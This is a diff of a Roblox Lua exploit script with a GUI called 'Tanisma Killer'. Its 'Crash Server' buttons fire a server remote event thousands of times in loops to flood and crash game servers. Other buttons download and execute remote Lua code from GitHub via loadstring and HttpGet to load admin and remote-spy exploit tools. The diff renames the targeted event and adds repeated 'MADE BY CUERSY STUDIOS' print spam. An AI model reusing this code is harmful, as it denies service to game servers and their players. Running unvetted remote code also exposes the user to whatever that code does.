@@ -4,57 +4,63 @@ local Window = Library.CreateLib("Tanisma Killer", "BloodTheme")
 -- ANA
 local main = Window:NewTab("Crash")
 local Section1 = main:NewSection("Crash Server")
-
 Section1:NewButton("ATOM BOMB", "This command send server 7000 request.", function()
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
     wait(10)
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
     wait(10)
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
-    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
 end)
 
 Section1:NewButton("C4", "This command send server 4000 request.", function()
-    for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
+    for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
+    for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
 wait(5)
-for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("r\7\n\7\n\7") Event:FireServer(A_1)   end
+for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
 end)
 local HDAdminCrash = Window:NewTab("Ek Scriptler")
 
 local hdadminsection = HDAdminCrash:NewSection("EK Scriptler")
+for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
 hdadminsection:NewButton("InfiniteYield", "ınfiniteYield", function ()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
 hdadminsection:NewButton("CMD X", "CMD X", function ()
+    for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
     loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
 end)
 
 hdadminsection:NewButton("RemoteSpy", "RemoteSpy", function()
+    for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
     loadstring(game:HttpGet("https://raw.githubusercontent.com/berastladeidilberimyecerkonundangenb/kajsdhawkjdhkjahdak/main/arsizzg%C3%B6%C3%BClliflaolmuyooo"))()
 end)
 hdadminsection:NewButton("Isim silme","Isim silme", function()
+    for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
     game:GetService("Players").LocalPlayer.Character.Head.OverheadGui:Destroy()
 end)
 hdadminsection:NewButton("Fate Admin", "Fate Admin", function ()
+    for i = 1, 1000 do print("MADE BY CUERSY STUDIOS") end
     loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
 end)
 local credit = Window:NewTab("Credit")
